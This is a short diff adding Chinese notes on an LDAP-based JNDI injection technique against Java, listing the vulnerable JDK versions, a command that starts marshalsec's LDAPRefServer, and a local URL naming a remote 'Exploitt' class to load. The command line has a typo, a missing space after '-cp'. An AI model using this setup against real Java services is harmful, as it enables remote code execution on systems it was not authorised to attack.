@@ -1,0 +1,9 @@
+基于ldap的利用方式
+
+适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。
+
+利用方式：
+
+java -cpmarshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
+
+http://127.0.0.1:8080/test/#Exploitt
